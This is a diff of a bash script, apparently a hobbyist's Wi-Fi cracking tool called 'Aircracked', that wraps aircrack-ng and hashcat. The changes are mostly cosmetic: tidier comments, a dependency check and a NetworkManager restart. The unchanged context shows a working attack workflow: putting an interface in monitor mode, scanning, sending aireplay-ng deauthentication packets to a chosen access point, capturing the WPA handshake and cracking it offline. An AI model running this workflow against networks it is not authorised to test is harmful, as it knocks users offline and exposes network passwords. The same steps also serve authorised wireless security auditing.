@@ -1,8 +1,7 @@
 #!/bin/bash
+# Today I learned a lot about how useful functions are, also it's currently 10:45 PM and I'm tired
 
-# ─────────────────────────────────────────
-#  Color codes
-# ─────────────────────────────────────────
+# Color codes
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -10,9 +9,7 @@ CYAN='\033[0;36m'
 BOLD='\033[1m'
 NC='\033[0m' # No Color
 
-# ─────────────────────────────────────────
-#  State variables
-# ─────────────────────────────────────────
+# State variables
 STAGE=1
 INTERFACE=""
 TARGET_BSSID=""
@@ -20,9 +17,45 @@ TARGET_CHANNEL=""
 TARGET_CLIENT=""
 CAPTURE_FILE=""
 
-# ─────────────────────────────────────────
-#  Helper functions
-# ─────────────────────────────────────────
+# Dependency checks
+check_dependencies() {
+  local missing_fatal=0
+
+  echo -e "\n  ${CYAN}[*] Checking dependencies...${NC}\n"
+
+  if command -v aircrack-ng &>/dev/null; then
+    echo -e "  ${GREEN}[✓] aircrack-ng found${NC}"
+    sleep 1
+  else
+    echo -e "  ${RED}[✗] aircrack-ng not found — this is required.${NC}"
+    missing_fatal=1
+  fi
+
+  if command -v hashcat &>/dev/null; then
+    echo -e "  ${GREEN}[✓] hashcat found${NC}"
+    sleep 1
+  else
+    echo -e "  ${YELLOW}[!] hashcat not found — hashcat cracking will not work.${NC}"
+    sleep 2
+  fi
+
+  if command -v hcxpcapngtool &>/dev/null; then
+    echo -e "  ${GREEN}[✓] hcxtools found${NC}"
+    sleep 1
+  else
+    echo -e "  ${YELLOW}[!] hcxtools not found — hashcat cracking will not work.${NC}"
+    sleep 2
+  fi
+
+  if [[ $missing_fatal -eq 1 ]]; then
+    echo -e "\n  ${RED}[!] Missing required dependencies. Exiting.${NC}\n"
+    exit 1
+  fi
+
+  echo ""
+}
+
+# Helper functions
 print_header() {
   clear
   local title="Aircracked -- StapleTT"
@@ -112,7 +145,7 @@ stage_monitor() {
 
     INTERFACE="${IFACES[$((CHOICE - 1))]}"
 
-    # ── Check for monitor mode support ───────────
+    # Check for monitor mode support
     echo -e "\n  ${CYAN}[*] Checking if $INTERFACE supports monitor mode...${NC}\n"
 
     if ! iw phy "$(iw dev "$INTERFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}')" \
@@ -148,7 +181,7 @@ stage_monitor() {
 }
 
 # ─────────────────────────────────────────
-#  Detect current terminal emulator
+#  Detect current terminal emulator (yes I'm aware this is inefficient)
 # ─────────────────────────────────────────
 detect_terminal() {
   local term_pid term_exe
@@ -357,7 +390,7 @@ stage_scan() {
 
   echo -e "\n  ${GREEN}[✓] Selected: $selected_essid — $TARGET_BSSID (CH $TARGET_CHANNEL)${NC}"
 
-  # Sanitize ESSID for use as a filename (replace spaces/special chars with _)
+  # Clean ESSID for use as a filename (replace spaces/special chars with _)
   local safe_essid
   safe_essid=$(echo "$selected_essid" | tr -cs '[:alnum:]_-' '_' | tr -s '_')
 
@@ -384,7 +417,7 @@ stage_capture() {
   print_header "Capture Handshake & Send Deauth"
   print_status
 
-  # ── Step 1: Focused capture ───────────────────
+  # Focused capture
   echo -e "  ${CYAN}[*] Step 1 — Starting focused capture on $TARGET_BSSID (CH $TARGET_CHANNEL)${NC}\n"
   confirm "Launch capture window?" || bail "Aborted."
 
@@ -396,7 +429,7 @@ stage_capture() {
   read -r
   while IFS= read -r -t 0 _; do :; done 2>/dev/null
 
-  # ── Step 2: Deauth ────────────────────────────
+  #Deauth
   echo -e "\n  ${CYAN}[*] Step 2 — Send deauthentication packets${NC}\n"
 
   while true; do
@@ -412,7 +445,7 @@ stage_capture() {
   flag=$(launch_in_terminal "sudo aireplay-ng -0 '$PACKET_COUNT' -a '$TARGET_BSSID' '$INTERFACE'")
   launch_in_terminal "$flag" "Sending deauth packets..."
 
-  # ── Step 3: Confirm handshake ─────────────────
+  # Confirm handshake
   echo -e "\n  ${YELLOW}[*] Watch the capture window for 'WPA handshake: $TARGET_BSSID'.${NC}"
   echo -e "  ${YELLOW}    Close the capture window once you see it.${NC}\n"
   echo -ne "  ${YELLOW}    Press Enter once the capture window is closed...${NC}"
@@ -525,7 +558,7 @@ stage_crack_hashcat() {
   local cleaned="$cap_dir/${cap_name}_cleaned.cap"
   local hash="$cap_dir/${cap_name}.hc22000"
 
-  # ── Step 1: Clean the capture file ───────────
+  # Clean the capture file
   echo -e "\n  ${CYAN}[*] Step 1 — Cleaning capture file...${NC}"
   sudo wpaclean "$cleaned" "$CAPTURE_FILE-01.cap" >/dev/null 2>&1
 
@@ -536,7 +569,7 @@ stage_crack_hashcat() {
   echo -e "  ${GREEN}[✓] Capture cleaned.${NC}"
   sleep 1
 
-  # ── Step 2: Convert to hc22000 ────────────────
+  # Convert to hc22000
   echo -e "\n  ${CYAN}[*] Step 2 — Converting to hashcat format...${NC}"
   sudo hcxpcapngtool -o "$hash" "$cleaned" >/dev/null 2>&1
 
@@ -552,7 +585,7 @@ stage_crack_hashcat() {
   echo -e "  ${GREEN}[✓] Cleaned capture removed.${NC}\n"
   sleep 1
 
-  # ── Step 3: Run hashcat ───────────────────────
+  # Run hashcat
   echo -e "  ${CYAN}[*] Running hashcat...${NC}"
   local log="$HOME/.aircracked/hashcat_$$.log"
 
@@ -588,12 +621,16 @@ stage_summary() {
   else
     echo -e "  ${RED}[!] Password not found. The wordlist did not contain the password.${NC}\n"
   fi
+
+  sudo systemctl restart NetworkManager
 }
 
 # ─────────────────────────────────────────
 #  Main loop
 # ─────────────────────────────────────────
 main() {
+  check_dependencies
+
   case $STAGE in
   1) stage_monitor ;&
   2) stage_scan ;&
